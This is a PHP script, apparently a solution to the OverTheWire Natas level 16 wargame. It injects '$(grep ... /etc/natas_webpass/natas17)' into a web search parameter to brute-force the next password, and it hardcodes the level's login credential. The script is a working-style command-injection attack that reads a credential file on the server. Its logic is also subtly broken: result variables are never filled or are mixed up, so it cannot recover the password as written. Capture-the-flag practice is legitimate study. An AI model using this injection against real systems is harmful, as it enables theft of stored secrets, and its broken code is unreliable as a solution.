<?php

# Global vars
$caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$tamanio = strlen($caracteres);

$almacen  = "";
$resultado = "";

$handle = curl_init();

$username = "natas16";
$password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V";

# Se obtiene los caracteres que pertenecen a la contraseña , se prueban todos los caracteres de la variable 
#Se envia la peticion a travez de un metodo post y la coneccion con la pagina de natas16
echo "Verificar caracteres ...\n";
for ($i = 0; $i < $tamanio; $i++) {

    curl_setopt_array($handle,
        array(
            CURLOPT_URL               => 'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep%20'. $caracteres[$i] .'%20/etc/natas_webpass/natas17)',
            CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
            CURLOPT_USERPWD           => "$username:$password",
            CURLOPT_RETURNTRANSFER    => true
        )
    );

    $server_output = curl_exec($handle);

}

echo "Caracteres ". $almacen;

#Se prueba los caracteres obtenidos en cada posicion para verificar la contraseña correcta
$tamanio_almacen = strlen($almacen);
for ($i = 0; $i < 32; $i++) {# 32 por que es la media  entre las contraseñas de natas
    for ($j = 0; $j < $tamanio_almacen; $j++) {

        curl_setopt_array($handle,
            array(
                CURLOPT_URL               => 'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep%20^' . $resultado . $almacen[$j] . '%20/etc/natas_webpass/natas17)',
                CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
                CURLOPT_USERPWD           => "$username:$password",
                CURLOPT_RETURNTRANSFER    => true
            )
        );

        $server_output = curl_exec($handle);

        if (stripos($server_output, "doomed") === false) {
            $final_pass = $final_pass . $almacen[$j];
            echo $resultado . "\n";
            break;
        }

    }
}

echo "Contraseña " . $resultado;


curl_close($handle);
